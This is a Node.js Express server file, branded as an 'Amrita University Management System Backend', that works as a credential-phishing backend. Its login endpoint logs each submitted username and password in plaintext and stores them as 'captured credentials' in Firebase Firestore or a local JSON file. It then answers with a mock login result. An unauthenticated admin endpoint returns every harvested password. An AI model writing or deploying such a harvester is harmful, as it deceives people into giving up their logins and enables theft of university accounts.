const express = require('express');
const cors = require('cors');
const path = require('path');
const admin = require('firebase-admin');
const fs = require('fs').promises;

const app = express();
const PORT = 3000;

// Enable CORS so the static frontend can communicate with the backend
app.use(cors());

// Parse JSON request bodies
app.use(express.json());

// Serve static frontend files from the same directory
app.use(express.static(__dirname));

// Local JSON storage path for credentials fallback
const CREDENTIALS_FILE = path.join(__dirname, 'credentials.json');

let db = null;
let useFirebase = false;

// Initialize Firebase Admin SDK if service account is provided in environment variables
if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    try {
        const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
        admin.initializeApp({
            credential: admin.credential.cert(serviceAccount)
        });
        db = admin.firestore();
        useFirebase = true;
        console.log('Connected to Firebase Cloud Firestore successfully.');
    } catch (err) {
        console.error('Firebase Cloud Firestore initialization error:', err.message);
        console.log('Attempting local JSON file fallback...');
    }
}

if (!useFirebase) {
    console.log('Firebase credentials not set. Using local credentials.json storage.');
}

// Database Helper: Save credential
async function saveCredential(username, password) {
    const timestamp = new Date().toISOString();
    
    if (useFirebase && db) {
        try {
            await db.collection('credentials').add({
                username,
                password,
                timestamp
            });
            console.log(`[FIREBASE SAVED] Captured credentials for user: "${username}"`);
            return;
        } catch (err) {
            console.error('[FIREBASE ERROR] Failed to save credential:', err.message);
            console.log('Falling back to local storage...');
        }
    }
    
    // Local JSON File Fallback
    try {
        let credentials = [];
        try {
            const fileData = await fs.readFile(CREDENTIALS_FILE, 'utf8');
            credentials = JSON.parse(fileData);
        } catch (readErr) {
            // File does not exist or is empty/corrupt, start with empty list
        }
        
        credentials.push({
            username,
            password,
            timestamp
        });
        
        await fs.writeFile(CREDENTIALS_FILE, JSON.stringify(credentials, null, 4), 'utf8');
        console.log(`[LOCAL SAVED] Captured credentials for user: "${username}" locally`);
    } catch (err) {
        console.error('[LOCAL STORAGE ERROR] Failed to save credential:', err.message);
    }
}

// Database Helper: Retrieve all credentials (latest first)
async function getCredentials() {
    if (useFirebase && db) {
        try {
            const snapshot = await db.collection('credentials').orderBy('timestamp', 'desc').get();
            const credentials = [];
            snapshot.forEach(doc => {
                credentials.push({
                    id: doc.id,
                    ...doc.data()
                });
            });
            return credentials;
        } catch (err) {
            console.error('[FIREBASE ERROR] Failed to fetch credentials:', err.message);
            console.log('Falling back to local storage...');
        }
    }
    
    // Local JSON File Fallback
    try {
        try {
            const fileData = await fs.readFile(CREDENTIALS_FILE, 'utf8');
            const credentials = JSON.parse(fileData);
            // Sort by timestamp descending
            return credentials.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        } catch (readErr) {
            return []; // No credentials yet
        }
    } catch (err) {
        console.error('[LOCAL STORAGE ERROR] Failed to fetch credentials:', err.message);
        throw err;
    }
}

// Login API endpoint
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    console.log(`[LOGIN TRY] Username: "${username}", Password: "${password}"`);

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            message: 'Username and password are required.'
        });
    }

    // Save user's credentials to active database layer
    await saveCredential(username, password);

    // Mock authentication:
    // If username or password contains 'error' (case-insensitive), simulate failure.
    if (username.toLowerCase().includes('error') || password.toLowerCase().includes('error')) {
        return res.status(401).json({
            success: false,
            message: 'Authentication failed: Invalid credentials or account locked.'
        });
    }

    return res.status(200).json({
        success: true,
        message: 'Login recorded successfully.'
    });
});

// Admin API endpoint to retrieve all credentials
app.get('/api/admin/credentials', async (req, res) => {
    try {
        const credentials = await getCredentials();
        return res.status(200).json({
            success: true,
            data: credentials
        });
    } catch (err) {
        console.error('[DATABASE ERROR] Failed to fetch credentials:', err);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve credentials from the database.'
        });
    }
});

// Conditionally run the local HTTP listener when run directly
if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`==================================================`);
        console.log(` Amrita University Management System Backend      `);
        console.log(` Running locally at: http://localhost:${PORT}      `);
        console.log(`==================================================`);
    });
}

module.exports = app;
